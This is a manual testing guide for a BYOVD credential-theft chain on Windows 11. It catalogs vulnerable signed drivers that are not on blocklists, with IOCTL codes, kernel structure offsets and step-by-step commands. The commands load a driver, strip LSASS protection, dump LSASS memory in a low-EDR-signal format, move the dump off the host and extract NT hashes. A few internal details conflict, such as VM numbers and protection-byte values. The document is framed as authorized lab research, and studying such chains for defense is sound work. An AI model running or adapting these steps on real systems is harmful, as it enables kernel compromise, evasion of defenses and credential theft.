# Manual Driver Testing Guide

> **Note:** Test results consolidated into **[../BYOVD-DRIVER-MATRIX.md](../BYOVD-DRIVER-MATRIX.md)**. This document contains testing procedures only.

**Date:** 2026-09-09 (updated)  
**Scope:** BYOVD candidate drivers from `drivers_23/candidates.csv` (49 drivers, 14 families) + novel drivers.
Isolated lab only. Authorized per CLAUDE.md.

**2026-09-08 Update:** Found 3 novel drivers NOT on loldrivers.io. RtsPpx.sys confirmed working. See [NOVEL-DRIVER-CANDIDATES.md](docs/NOVEL-DRIVER-CANDIDATES.md).

---

## Lab Environment

| Item | Value |
|---|---|
| Proxmox host | `root@<PVE_HOST>` (set via env var) |
| Test VM | **VM 125**, Windows 11 22H2 x64, build 22621 |
| VM IP | `<VM_IP>` (set via env var) |
| VM credentials | (set via env vars `VM_USER` / `VM_PASS`) |
| Snapshot (clean) | `byovd-files-ready` (Defender off, cascade.exe + drivers pre-staged at `C:\Users\Public\byovd\`) |
| Staging path on guest | `C:\Users\Public\byovd\` |
| EPROCESS offsets (22621) | UniqueProcessId=0x440, ActiveProcessLinks=0x448, Token=0x4B8, Protection=0x87A, ImageFileName=0x5A8 |
| Analysis box | macOS (this machine), pypykatz installed |
| Local VM (Fusion) | `baddrivers_vm` — Windows 11 22H2 x64, encrypted |

> **WARNING:** VM 126 is ARM64 Windows. All drivers in bigDrivers are x86-64 and CANNOT load on ARM64 (error 1275). Use **VM 125** for all BYOVD testing.

### Reverting to clean state

```bash
ssh root@$PVE_HOST "qm rollback 125 byovd-files-ready && qm start 125"
sleep 40   # wait for guest agent
```

Always revert between driver families. A driver that BSODs or corrupts state poisons later tests.

---

## Candidate Drivers (Tier 1, all LOADABLE)

Sorted by testing priority. "Cascade adapter" means `cascade.exe --driver-type <name>` already supports it.

### Priority 1: BiosToolCommonDriver.sys (baseline, CONFIRMED)

Already proven end-to-end. Use as the control.

| Field | Value |
|---|---|
| cascade flag | `--driver-type biostool` |
| Device | `\\.\BiosToolCommonDriver` |
| IOCTLs | 0x22202C (read phys), 0x222030 (write phys), 0x222034 (VA to PA) |
| Primitive | Arbitrary physical memory R/W + VA-to-PA translation |
| Status | **CONFIRMED**: PPL strip, ObCallback patch, RPM dump, NT hash extracted |
| Expected result | 28/28 PASS in `cascade_e2e.py`, NT hash `8846f7eaee8fb117ad06bdd830b7586c` |

### Priority 2: WinRing0.sys

| Field | Value |
|---|---|
| Cascade flag | `--driver-type winring0` |
| Device | `\\.\WinRing0_1_2_0` |
| IOCTLs | 0x9C402584 (read), 0x9C402588 (write) |
| Primitive | MmMapIoSpace, direct physical memory R/W, I/O port, MSR |
| Signer | Varies (Acer, ASUS, others) |
| Versions in collection | 4 (all v1.2.0.5, different signers) |
| Prior result | **BLOCKED by Secure Boot** (OVMF firmware on Proxmox KVM). See troubleshooting. |

**Recommended hash:** `63e49412093cd757...` (Acer-signed)

**Expected result (if Secure Boot is off):** `--test-rw` prints ntoskrnl base, walks EPROCESS list, finds lsass. Full chain should work (phys R/W primitive is well-documented).

**Expected result (if Secure Boot is on):** `sc start` returns `ERROR_DRIVER_BLOCKED (1275)` or the driver fails signature check. The OVMF firmware enforces even when test signing is enabled.

**Troubleshooting:** The prior test (2026-09-03) found Secure Boot blocking unsigned/cross-signed drivers on the OVMF KVM firmware. To test WinRing0:
1. Confirm Secure Boot state: `Confirm-SecureBootUEFI` (PowerShell). If True, WinRing0 will fail.
2. Option A: Disable Secure Boot in VM BIOS (Proxmox: set `efidisk0` to `enrolled-keys=0`, or use SeaBIOS instead of OVMF).
3. Option B: Use a WinRing0 version signed by a CA that chains to the Microsoft UEFI root (the ASUS-signed variant `d052767066dd5ee9...` may work since ASUS has WHQL-signed WinRing0 builds).

### Priority 3: AsIO3.sys (ASUS)

| Field | Value |
|---|---|
| Cascade flag | `--driver-type asio3` |
| Device | `\\.\Asusgio3` |
| IOCTLs | 0x22200C (read), 0x222008 (write) |
| Primitive | Physical memory R/W via IOCTL |
| Signer | ASUSTeK COMPUTER INC. (EV code-signing) |
| Versions in collection | 10 (v1.02.22 through v1.04.04, all LOADABLE) |
| Prior result | **SKIP**: disassembly indicated I/O port access only, not physical memory. Needs re-verification. |

**Recommended hash:** `95b6c8f8747c0652...` (v1.04.04, newest)

**Expected result (optimistic):** If the IOCTL layout matches what cascade expects (phys addr in, data out), `--test-rw` succeeds. AsIO3 is documented on loldrivers.io as having arbitrary phys R/W.

**Expected result (pessimistic):** If this version's IOCTLs map I/O ports rather than physical memory, DeviceIoControl returns success but data is garbage (port reads, not RAM). The prior note said "I/O port access only" for an unspecified version.

**Action if port-only:** Try an older version (v1.02.22 through v1.02.41). The phys R/W IOCTL may exist only in certain firmware-era builds. Open in Ghidra and check the IOCTL dispatch for `MmMapIoSpace` calls (phys R/W) vs. `READ_PORT_UCHAR` / `WRITE_PORT_UCHAR` (port I/O).

### Priority 4: NTIOLib.sys (MSI)

| Field | Value |
|---|---|
| Cascade flag | `--driver-type ntiolib` |
| Device | `\\.\NTIOLib_MysticLight` |
| IOCTLs | 0x9C40A428 (read), 0x9C40A424 (write) |
| Primitive | Physical memory R/W via IOCTL |
| Signer | MICRO-STAR INTERNATIONAL CO., LTD. |
| Versions in collection | 5 (v3.0.0.13 through v3.0.0.15, all LOADABLE) |
| Prior result | **FAIL**: Device opened OK, DeviceIoControl returned error 6 (ERROR_INVALID_HANDLE) on every read. |

**Recommended hash:** `0b4658554045e6ee...` (v3.0.0.13)

**Expected result:** Likely fails again with error 6 unless the cascade adapter's IOCTL buffer layout is wrong for this version. Needs Ghidra analysis of the actual IRP_MJ_DEVICE_CONTROL handler to determine the correct input struct.

**Debugging steps:**
1. Confirm the device opens: `CreateFileW("\\.\NTIOLib_MysticLight", ...)` returns a valid handle (not INVALID_HANDLE_VALUE).
2. If the handle is valid but DeviceIoControl fails with error 6, the IOCTL code or buffer format is wrong.
3. Load the .sys in Ghidra. Find the dispatch table (DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL]). Trace the IOCTL switch/case to find the correct codes and struct layouts.
4. Compare against cascade's `ntiolib` adapter in `src/cascade.cpp`.

### Priority 5: IOMap.sys (ASUS)

| Field | Value |
|---|---|
| Cascade flag | `--driver-type iomap` |
| Device | `\\.\IOMap` |
| IOCTLs | 0x80102040 (read), 0x80102044 (write) |
| Primitive | Physical memory R/W via IOCTL |
| Signer | ASUSTeK COMPUTER INC. |
| Versions in collection | 2 (both v3.0, different hashes, all LOADABLE) |
| Prior result | **FAIL**: IOCTL accepted (no error), but 0 bytes returned. Likely reading I/O port QWORD rather than physical memory. |

**Recommended hash:** `03fffd666bd9c046...`

**Expected result:** Likely returns 0 bytes again. The IOCTL codes may be correct but the input struct layout wrong, or the driver's "read" maps a port rather than a physical address.

**Debugging steps:** Same as NTIOLib. Ghidra the dispatch handler. Check whether the IOCTL reads physical memory (look for `MmMapIoSpace`, `MmCopyMemory`) or I/O ports (`READ_PORT_ULONG`).

### Priority 6: LnvMSRIO.sys (Lenovo)

| Field | Value |
|---|---|
| Cascade flag | `--driver-type lnvmsrio` |
| Device | `\\.\WinMsrDev` |
| IOCTLs | 0x9C402584 (read), 0x9C402588 (write) |
| Primitive | Physical memory R/W + MSR R/W + LSTAR overwrite |
| CVE | CVE-2025-8061 |
| Signer | Lenovo |
| Versions in collection | 3 (v3.1.0.33 through v3.2.0.17, all LOADABLE) |
| Prior result | **SKIP**: PDB name `LnvMSRIO.pdb` suggests MSR-only driver. Single IOCTL 0x8900001C found in prior disassembly. |

**Recommended hash:** `6d236a1874d637ba...` (v3.2.0.17, newest)

**Expected result:** The cascade adapter maps IOCTL codes 0x9C402584/0x9C402588 (WinRing0-compatible codes). If LnvMSRIO actually uses 0x8900001C (per prior disassembly), the adapter will fail with ERROR_INVALID_FUNCTION or similar.

**Why it matters:** CVE-2025-8061 documents LSTAR overwrite capability, which is a kernel code execution primitive (not just R/W). If the phys R/W IOCTLs exist alongside MSR, this is the strongest candidate in the collection.

**Debugging steps:**
1. Open v3.2.0.17 in Ghidra.
2. Find all IOCTL codes in the dispatch handler.
3. If phys R/W IOCTLs exist, update cascade's `lnvmsrio` adapter with the correct codes and struct.
4. If MSR-only, the primitive chain is: MSR write to LSTAR -> SYSCALL hijack -> arbitrary kernel code exec. This is a different (more powerful) exploitation path than the BiosTool phys R/W approach. Would require a new cascade mode.

### Priority 7: nvpciflt.sys (NVIDIA)

| Field | Value |
|---|---|
| Cascade flag | **None (no adapter yet)** |
| Device | Unknown (needs RE) |
| IOCTLs | Unknown (needs RE) |
| Primitive | Physical memory R/W via PCI BAR access |
| Signer | NVIDIA Corporation |
| Versions in collection | 5 (v32.0.15.8180 through v32.0.15.8253, all LOADABLE) |
| Prior result | Not tested |

**Recommended hash:** `9d37257833d412e3...` (v32.0.15.8253, newest)

**Expected result:** Cannot test until a cascade adapter is written. Needs full RE first.

**Why interesting:** NVIDIA-signed, 5 LOADABLE versions, not blocklisted. PCI BAR access gives physical memory mapping similar to MmMapIoSpace.

**Steps:**
1. Ghidra analysis: find device name, IOCTL codes, buffer layouts.
2. Write cascade adapter (new `ProviderType::NvPciFlt` case in `src/cascade.cpp`).
3. Then follow the standard test sequence below.

### Priority 8: sptd/sptd2.sys (Daemon Tools)

| Field | Value |
|---|---|
| Cascade flag | **None (no adapter yet)** |
| Device | Unknown |
| Primitive | Kernel memory access via filter/IOCTL |
| Signer | GlobalSign |
| Versions in collection | 2 (all LOADABLE) |
| Prior result | Not tested |

**Expected result:** Uncertain. sptd is a minifilter/SCSI pass-through driver. The "kernel memory access" primitive may be indirect (filter callbacks) rather than a clean IOCTL-based R/W. Lowest priority for manual testing.

---

## Tier 2 and 3 Candidates (lower priority)

These have weaker or more specialized primitives. Test only if all Tier 1 candidates fail.

| Family | Tier | Count | Primitive | Note |
|---|---|---|---|---|
| semav6msr64 (Intel) | 2 | 3 | MSR R/W only | No direct phys mem. Useful for kASLR bypass, not R/W chain. |
| sepdal (Intel) | 2 | 3 | SEP/IA32 access | Platform-specific, may require Intel SEP hardware. |
| AppControl | 2 | 4 | Hook/PEB + R/W | Version-dependent, Notion bypass. Complex exploitation. |
| AsusSAIO | 2 | 5 | Sound/IO IOCTL | Unlikely to have kernel R/W. |
| SpyShelter | 2 | 1 | Hook driver | Hooking primitive, not direct R/W. |
| MonProcess (Honor) | 3 | 1 | PID kill only | No R/W at all. Only useful for process termination. |
| HwSMBus (Huawei) | 3 | 1 | SMBus R/W | Hardware bus, not general kernel memory. |

---

## Manual Test Procedure (per driver)

### Prerequisites

- cascade.exe cross-compiled and staged at `C:\Users\Public\byovd\cascade.exe`
- Target .sys copied from `drivers_23/bigDrivers/<sha256>.sys` to the guest
- VM reverted to `byovd-files-ready` snapshot
- Run from an elevated (Administrator) cmd/PowerShell on the guest

### Phase 1: Load gate (does the blocklist allow it?)

```powershell
# Copy driver to staging (from Proxmox host or SCP):
# scp drivers_23/bigDrivers/<sha256>.sys localuser@<vm_ip>:C:\Users\Public\byovd\TestDriver.sys

# On the guest (elevated):
sc create TestDrv binPath= "C:\Users\Public\byovd\TestDriver.sys" type= kernel start= demand
sc start TestDrv
```

| Outcome | Meaning | Next step |
|---|---|---|
| Service started successfully | Driver loaded. Not blocklisted. | Proceed to Phase 2. |
| ERROR_DRIVER_BLOCKED (1275) | On the MS Vulnerable Driver Blocklist for this hash. | Try a different version of the same family. |
| ERROR_INVALID_IMAGE_HASH (577) | Secure Boot rejected the signature. | Disable Secure Boot or use a WHQL-signed variant. |
| ERROR_FILE_NOT_FOUND (2) | Path wrong or .sys missing. | Fix the path. |
| Other error | Driver-specific init failure. | Check Event Viewer > System for details. |

```powershell
# Cleanup after Phase 1 (whether it succeeded or failed):
sc stop TestDrv 2>$null
sc delete TestDrv
```

### Phase 2: Device object verification

```powershell
# Check that the expected device path exists and is openable.
# Replace the device name per the table above.

# PowerShell test (returns handle or error):
$h = [System.IO.FileStream]::new("\\.\WinRing0_1_2_0", [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite)
$h.Close()

# If you do not know the device name, enumerate loaded driver devices:
Get-WmiObject Win32_PnPSignedDriver | Where { $_.DeviceName -like "*WinRing*" -or $_.InfName -like "*winring*" } | Select DeviceName, DriverProviderName
# Or use WinObj (Sysinternals) to browse \Device\ and \DosDevices\ namespaces.
```

| Outcome | Meaning | Next step |
|---|---|---|
| Handle opens successfully | Device is accessible from user mode. | Proceed to Phase 3. |
| ERROR_FILE_NOT_FOUND | Device name is wrong, or driver did not create a device object. | Check with WinObj or `driverquery /v`. Ghidra the DriverEntry to find the real device name. |
| ERROR_ACCESS_DENIED | Device has a security descriptor blocking your token. | Try running as SYSTEM (psexec -s), or check the DACL in WinObj. |

### Phase 3: Kernel R/W verification (cascade --test-rw)

This is the critical gate. If `--test-rw` passes, the driver provides a working kernel R/W primitive and the full chain will work.

```powershell
# Load the driver first if not already loaded:
sc create TestDrv binPath= "C:\Users\Public\byovd\TestDriver.sys" type= kernel start= demand
sc start TestDrv

# Run test-rw with the correct driver-type flag:
C:\Users\Public\byovd\cascade.exe --driver C:\Users\Public\byovd\TestDriver.sys --driver-type winring0 --test-rw
```

| Outcome | Expected output | Meaning |
|---|---|---|
| **PASS** | `[+] PASSED`, prints ntoskrnl base (0xFFFFF8...), EPROCESS addresses, finds lsass | Driver provides working kernel R/W through cascade's adapter. |
| FAIL: cannot open device | `[-] CreateFile failed` | Phase 2 problem. Wrong device name in cascade's adapter. |
| FAIL: IOCTL error | `[-] DeviceIoControl failed, error=N` | IOCTL code or buffer layout mismatch. Needs Ghidra RE of the actual dispatch handler. |
| FAIL: garbage data | `[-] ntoskrnl base invalid` or walk finds 0 processes | IOCTL succeeds but returns wrong data (port I/O vs. phys mem, or wrong struct offsets). |
| BSOD | VM crashes | Driver bug or cascade wrote to wrong address. Revert snapshot. Check cascade's provider for off-by-one in buffer layout. |

### Phase 4: Dry run (read-only recon)

```powershell
C:\Users\Public\byovd\cascade.exe --driver C:\Users\Public\byovd\TestDriver.sys --driver-type winring0 --dry-run
```

**Expected output:**
```
[*] ntoskrnl base: 0xFFFFF80X`XXXXXXXX
[*] PsInitialSystemProcess: 0xFFFFXXXX`XXXXXXXX
[*] System EPROCESS: 0xFFFFXXXX`XXXXXXXX
[*] lsass.exe EPROCESS: 0xFFFFXXXX`XXXXXXXX  PID=NNN
[*] Protection byte: 0x10  (PsProtectedSignerLsa-Light)
[*] Dry run: no modifications made.
```

If the Protection byte reads as `0x10` (PPL-Light) or `0x31` (PPL), the driver's read primitive is correctly resolving kernel structures.

### Phase 5: Process listing

```powershell
C:\Users\Public\byovd\cascade.exe --driver C:\Users\Public\byovd\TestDriver.sys --driver-type winring0 --list-procs --verbose
```

**Expected output:** A table of PID, process name, and Protection byte for all running processes. Verify:
- System (PID 4) is present
- lsass.exe is present with correct PID (cross-check with `tasklist | find "lsass"`)
- smss.exe, csrss.exe, services.exe are present (basic sanity)

### Phase 6: ObCallback enumeration

```powershell
C:\Users\Public\byovd\cascade.exe --driver C:\Users\Public\byovd\TestDriver.sys --driver-type winring0 --list-callbacks
```

**Expected output:** Lists registered ObRegisterCallback entries. If Defender / WdFilter is active, you should see `WdFilter.sys` in the callback list. If Defender is off (the `byovd-files-ready` snapshot has it off), the list may be empty or show only third-party callbacks.

### Phase 7: PPL strip and restore

```powershell
$lsass = (Get-Process lsass).Id

# Strip PPL:
C:\Users\Public\byovd\cascade.exe --driver C:\Users\Public\byovd\TestDriver.sys --driver-type winring0 --ppl-strip --pid $lsass

# Verify it was stripped (should show 0x00):
C:\Users\Public\byovd\cascade.exe --driver C:\Users\Public\byovd\TestDriver.sys --driver-type winring0 --dry-run

# Re-add PPL (restore):
C:\Users\Public\byovd\cascade.exe --driver C:\Users\Public\byovd\TestDriver.sys --driver-type winring0 --ppl-add --pid $lsass
```

**Expected:** Protection byte goes from `0x10` to `0x00` after strip, back to `0x62` after add.

### Phase 8: LSASS dump (the goal)

```powershell
# Recommended: RPM format (lower EDR signal, no MDMP signature on disk)
C:\Users\Public\byovd\cascade.exe --driver C:\Users\Public\byovd\TestDriver.sys --driver-type winring0 --dump-rpm --out C:\Users\Public\byovd\lsass_test.bin --no-xor

# Check file size (should be 40-60 MB for a typical LSASS):
(Get-Item C:\Users\Public\byovd\lsass_test.bin).Length / 1MB
```

**Expected output:**
```
[*] DumpRpm: N regions, M bytes written to C:\Users\Public\byovd\lsass_test.bin
```

File size should be 30-60 MB. Under 10 MB means the dump is incomplete (some regions failed to read).

### Phase 9: Offline credential extraction (on analyst box)

```bash
# Exfil the dump (SCP, or use --dump-tcp on the VM with nc listener here)
scp localuser@<vm_ip>:C:/Users/Public/byovd/lsass_test.bin /tmp/

# Convert RPM to MiniDump:
python3 tools/rpm2minidump.py /tmp/lsass_test.bin /tmp/lsass_test.dmp

# Extract credentials:
pypykatz lsa minidump /tmp/lsass_test.dmp
```

**Expected output:** NT hash for `localuser` account: `8846f7eaee8fb117ad06bdd830b7586c` (password: "password"). If you see this hash, the driver's full chain is confirmed working.

### Phase 10: Cleanup

```powershell
# On the guest:
Remove-Item C:\Users\Public\byovd\lsass_test.bin -Force
sc stop TestDrv
sc delete TestDrv

# Or just revert the snapshot:
# ssh root@$PVE_HOST "qm rollback 125 byovd-files-ready"
```

---

## Recording Results

After testing each driver, update the matrix below. Copy this table into `notes/BYOVD-WIN11-22621-LSASS.md` or keep it here.

### Driver Test Matrix (to be filled during testing)

| Driver | SHA256 (first 16) | Version | Load? | Device OK? | test-rw? | Dump? | NT Hash? | Notes |
|---|---|---|---|---|---|---|---|---|
| BiosToolCommon | (baseline) | N/A | YES | YES | PASS | PASS | YES | Confirmed 2026-08-28 |
| **RtsPpx (NOVEL)** | 0259226bce1a4132 | N/A | YES | YES | **PASS** | TBD | TBD | **CONFIRMED 2026-09-08, NOT on loldrivers** |
| **RwDrv (NOVEL)** | 6c32b33f0a2ebf79 | N/A | TBD | TBD | TBD | TBD | TBD | Novel hash, backend ready |
| **RMDRVSYS (NOVEL)** | b24f0d3db0a24214 | N/A | TBD | TBD | TBD | TBD | TBD | Needs Ghidra RE |
| WinRing0 (Acer) | 63e49412093cd757 | 1.2.0.5 | | | | | | Blocked by SecureBoot last time |
| WinRing0 (ASUS) | d052767066dd5ee9 | 1.2.0.5 | | | | | | Try WHQL-signed variant |
| AsIO3 | 95b6c8f8747c0652 | 1.04.04 | | | | | | Port-only last time, re-check |
| AsIO3 (older) | b8f8d07cc25f7b18 | 1.02.22 | | | | | | Try older if 1.04 is port-only |
| NTIOLib | 0b4658554045e6ee | 3.0.0.13 | | | | | | Error 6 last time |
| IOMap | 03fffd666bd9c046 | 3.0 | | | | | | 0 bytes last time |
| LnvMSRIO | 6d236a1874d637ba | 3.2.0.17 | | | | | | Check if phys R/W IOCTLs exist |
| nvpciflt | 9d37257833d412e3 | 32.0.15.8253 | | | | | | Needs adapter + RE first |

---

## Deploying Drivers to VM 126

### From macOS via Proxmox host (recommended)

```bash
# 1. Copy .sys from local collection to Proxmox host
HASH="63e49412093cd7576dbf571f11b6f1c6bac5bb22dcb99e1eb178a52c1d26686a"
scp drivers_23/bigDrivers/${HASH}.sys root@$PVE_HOST:/tmp/TestDriver.sys

# 2. Push from Proxmox into VM 126 via qm guest exec
ssh root@$PVE_HOST "
  cat /tmp/TestDriver.sys | base64 | \
  qm guest exec 125 -- powershell -Command \
    '[IO.File]::WriteAllBytes(\"C:\\Users\\Public\\byovd\\TestDriver.sys\", [Convert]::FromBase64String((Read-Host)))'
"

# Or: simpler, use the existing SCP method if SSH is configured on the guest
scp drivers_23/bigDrivers/${HASH}.sys localuser@<vm_ip>:C:/Users/Public/byovd/TestDriver.sys
```

### Deploying cascade.exe (if not already staged)

```bash
# Cross-compile on macOS:
cd /Users/lmakonem/repos/Research/BadDrivers
x86_64-w64-mingw32-g++ -O2 -s -fno-ident \
    -static-libgcc -static-libstdc++ src/cascade.cpp \
    -lws2_32 -lntdll -ldbghelp -lpsapi -ladvapi32 \
    -o build/Release/cascade.exe

# Deploy to VM:
scp build/Release/cascade.exe localuser@<vm_ip>:C:/Users/Public/byovd/cascade.exe
scp build/Release/libwinpthread-1.dll localuser@<vm_ip>:C:/Users/Public/byovd/
```

---

## Ghidra Analysis Workflow (for drivers that fail or lack adapters)

When a driver fails `--test-rw` or has no cascade adapter, reverse-engineer it:

1. Copy the .sys from `drivers_23/bigDrivers/<sha256>.sys`
2. Open Ghidra, import as PE x86:LE:64
3. Find `DriverEntry` (entry point). It calls `IoCreateDevice` (device name) and sets up `DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL]`
4. Follow the dispatch function. Look for a switch/case on the IOCTL code (usually `Irp->Parameters.DeviceIoControl.IoControlCode`)
5. For each IOCTL case, document:
   - IOCTL code (hex)
   - Input buffer layout (struct fields, sizes)
   - What kernel API it calls (`MmMapIoSpace` = phys R/W, `__readmsr`/`__writemsr` = MSR, `READ_PORT_*` = port I/O)
   - Output buffer layout
6. If phys R/W IOCTLs exist, write or update the cascade adapter in `src/cascade.cpp`

Key functions to search for in Ghidra (indicates exploitable primitives):
- `MmMapIoSpace` / `MmMapIoSpaceEx`: physical memory mapping (best primitive)
- `MmCopyMemory`: physical memory copy
- `MmGetPhysicalAddress`: VA-to-PA translation
- `__readmsr` / `__writemsr`: MSR access (kASLR bypass, LSTAR overwrite)
- `READ_PORT_UCHAR` / `WRITE_PORT_UCHAR`: I/O port (less useful for our chain)

---

## Quick Reference: cascade.exe Driver-Type Flags

| `--driver-type` | Driver family | Device name | Read IOCTL | Write IOCTL | Notes |
|---|---|---|---|---|---|
| `biostool` | BiosToolCommonDriver | `\\.\BiosToolCommonDriver` | 0x22202C | 0x222030 | CONFIRMED |
| `rtsppx` | RtsPpx (Realtek) | `\\.\RtsPpx` | 0x222000 | 0x222008 | **NOVEL, CONFIRMED** |
| `rwdrv` | RwDrv (lab-z) | `\\.\fmem3` | 0x80002000 | 0x80002004 | **NOVEL hash** |
| `winring0` | WinRing0 | `\\.\WinRing0_1_2_0` | 0x9C402584 | 0x9C402588 | |
| `ntiolib` | NTIOLib (MSI) | `\\.\NTIOLib_MysticLight` | 0x9C40A428 | 0x9C40A424 | |
| `asio3` | AsIO3 (ASUS) | `\\.\Asusgio3` | 0x22200C | 0x222008 | |
| `lnvmsrio` | LnvMSRIO (Lenovo) | `\\.\WinMsrDev` | 0x9C402584 | 0x9C402588 | |
| `iomap` | IOMap (ASUS) | `\\.\IOMap` | 0x80102040 | 0x80102044 | |
| `ktapi` | ktapi | (service-dependent) | 0x82007000 | 0x82007100 | |
| `pdfwkrnl` | PdFwKrnl (AMD) | `\\.\Global\PdFwKrnl` | 0x80002014 | 0x80002014 | |
| `directio` | DirectIo64 | (dynamic service name) | 0x8011E044 | 0x8011E0A0 | |

---

## Automated E2E Test Suite (for confirmed drivers)

Once a driver passes manual Phase 3 (`--test-rw`), you can run the full automated suite. The suite is written for BiosToolCommonDriver but the flags can be adapted:

```bash
# Edit tests/cascade_e2e.py:
#   DRV = r"C:\Users\Public\byovd\TestDriver.sys"
# And update the cascade command to include --driver-type <type>

# Single run (28 checks):
python3 tests/cascade_e2e.py

# 5-run certification with snapshot revert:
python3 tests/run_suite.py --runs 5 --snap byovd-files-ready
```

Currently the E2E suite hardcodes `--driver-type biostool`. To test other drivers with it, you would need to either:
1. Modify `cascade_e2e.py` to accept `--driver-type` as a parameter, or
2. Test manually through Phases 1-9 above (recommended for initial validation)

---

## Success Criteria

A driver is **CONFIRMED** for the BYOVD chain when:

1. `sc start` succeeds (not blocklisted, not Secure Boot rejected)
2. Device object opens from user mode
3. `cascade.exe --test-rw` prints PASSED
4. `cascade.exe --dump-rpm` produces a 30+ MB file
5. `pypykatz lsa minidump` extracts the known NT hash (`8846f7eaee8fb117ad06bdd830b7586c`)

A driver is **PARTIAL** when steps 1-3 pass but the dump fails (e.g., phys R/W works but VA-to-PA translation is missing or the write primitive is needed for PPL strip and does not work).

A driver is **FAILED** when any of steps 1-3 fail consistently across versions.
